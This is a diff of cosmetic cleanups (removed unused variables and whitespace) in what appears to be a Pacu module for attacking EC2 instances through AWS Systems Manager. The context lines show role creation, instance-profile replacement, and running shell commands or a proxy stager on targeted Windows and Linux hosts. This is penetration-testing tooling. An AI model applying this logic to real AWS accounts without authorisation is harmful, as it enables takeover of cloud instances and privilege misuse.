@@ -103,19 +103,18 @@ def main(args, pacu_main):
                 aws_session_token=session.session_token,
                 config=botocore.config.Config(proxies={'https': 'socks5://127.0.0.1:8001', 'http': 'socks5://127.0.0.1:8001'}) if not proxy_settings.target_agent == [] else None
             )
-            dryrun = client.describe_images(
+            client.describe_images(
                 DryRun=True
             )
         except ClientError as error:
             if not str(error).find('UnauthorizedOperation') == -1:
                 print('Dry run failed, the current AWS account does not have the necessary permissions to run "describe_images". Operating system enumeration is no longer trivial.\n')
 
-    
         os_with_default_ssm_agent = [
             '[\s\S]*Windows[\s\S]*Server[\s\S]*2016[\s\S]*',
             '[\s\S]*Amazon[\s\S]*Linux[\s\S]*',
             '[\s\S]*Ubuntu[\s\S]*Server[\s\S]*18\\.04[\s\S]*LTS[\s\S]*',
-            #'Windows Server 2003-2012 R2 released after November 2016'
+            # 'Windows Server 2003-2012 R2 released after November 2016'
         ]
 
         # Begin enumeration of vulnerable images
@@ -156,7 +155,7 @@ def main(args, pacu_main):
                             break
                 print('  {} vulnerable images found.\n'.format(count))
         print('Total vulnerable images found: {}\n'.format(len(vuln_images)))
-    
+
     if ssm_instance_profile_name == '':
         # Begin Systems Manager role finder/creator
         client = boto3.client(
@@ -229,7 +228,7 @@ def main(args, pacu_main):
                 ssm_role_name = create_response['RoleName']
 
                 # Attach the SSM policy to the role just created
-                attach_response = client.attach_role_policy(
+                client.attach_role_policy(
                     RoleName=ssm_role_name,
                     PolicyArn='arn:aws:iam::aws:policy/service-role/AmazonEC2RoleforSSM'
                 )
@@ -373,7 +372,7 @@ def main(args, pacu_main):
                         AssociationId=association_id,
                         IamInstanceProfile={
                             'Name': ssm_instance_profile_name
-                        }    
+                        }
                     )
                     targeted_instances.append(instance_id)
                     print('  Instance profile replaced for instance ID {}.'.format(instance_id))
@@ -385,7 +384,7 @@ def main(args, pacu_main):
                     else:
                         replace = False
                         break
-            
+
     print('\n  Done.\n')
 
     # Start polling SystemsManager/RunCommand to see if instances show up
@@ -442,7 +441,7 @@ def main(args, pacu_main):
                             print('  Unknown operating system for instance ID {}: {}. Not attacking it...\n'.format(instance[0], instance[1]))
 
             # Collectively attack all new instances that showed up in the last check for this region
-           
+
             # Windows
             if len(windows_instances_to_attack) > 0 and (args.target_os.lower() == 'all' or args.target_os.lower() == 'windows'):
                 # If a shell command was passed in, run it. Otherwise, try to install python3 then run a PacuProxy stager
@@ -462,7 +461,7 @@ def main(args, pacu_main):
                 )
                 this_check_attacked_instances.extend(windows_instances_to_attack)
                 attacked_instances.extend(windows_instances_to_attack)
-            
+
             # Linux
             if len(linux_instances_to_attack) > 0 and (args.target_os.lower() == 'all' or args.target_os.lower() == 'linux'):
                 # If a shell command was passed in, run it. Otherwise, try to install python3 then run a PacuProxy stager
@@ -482,13 +481,13 @@ def main(args, pacu_main):
                 )
                 this_check_attacked_instances.extend(linux_instances_to_attack)
                 attacked_instances.extend(linux_instances_to_attack)
-            
+
         print('  {} new instances attacked in the latest check: {}\n'.format(len(this_check_attacked_instances), this_check_attacked_instances))
 
         if attacked_instances == targeted_instances:
             # All targeted instances have been attacked, stop polling every 30 seconds
             break
-        
+
         # Don't wait 30 seconds after the very last check
         if not i == 20:
             print('Waiting 30 seconds...\n')
